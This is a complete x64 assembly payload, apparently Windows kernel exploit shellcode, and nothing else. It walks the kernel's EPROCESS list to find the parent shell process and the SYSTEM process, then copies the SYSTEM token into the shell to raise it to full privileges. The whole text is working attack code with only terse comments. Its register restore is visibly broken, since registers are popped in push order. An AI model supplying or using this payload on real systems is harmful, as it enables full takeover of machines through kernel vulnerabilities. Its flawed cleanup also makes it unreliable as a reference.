push rax
push rbx
push rcx
push rdx
push rsi
push rdi

mov rax, gs:[0x188]			; Find current _KTHREAD
mov rax,  [rax +0x210]		; Find current _KPROCESS/_EPROCESS
mov rbx,  [rax + 0x290]		; Find parent PID (cmd.exe or powershell.exe)

find_cmd_proc:
mov rax, [rax + 0x188]		; ActiveProcessLinks.Flink
sub rax, 0x188				; Next EPROCESS
cmp rbx, [rax + 0x180]		; Check _EPROCESS.UniqueProcessId with target PID
jnz find_cmd_proc

mov rcx, rax				; Save target process
mov rbx, 4					; 4 is PID of SYSTEM

find_system_proc:			; Same shit as 1st loop
mov rax, [rax + 0x188]		; ActiveProcessLinks.Flink
sub rax, 0x188				; Next EPROCESS
cmp rbx, [rax + 0x180]		; Check _EPROCESS.UniqueProcessId with target PID
jnz find_system_proc

mov rdx, [rax + 0x208]		; Copy token value
mov [rcx + 0x208], rdx

pop rax
pop rbx
pop rcx
pop rdx
pop rsi
pop rdi

add rsp, 0x28
ret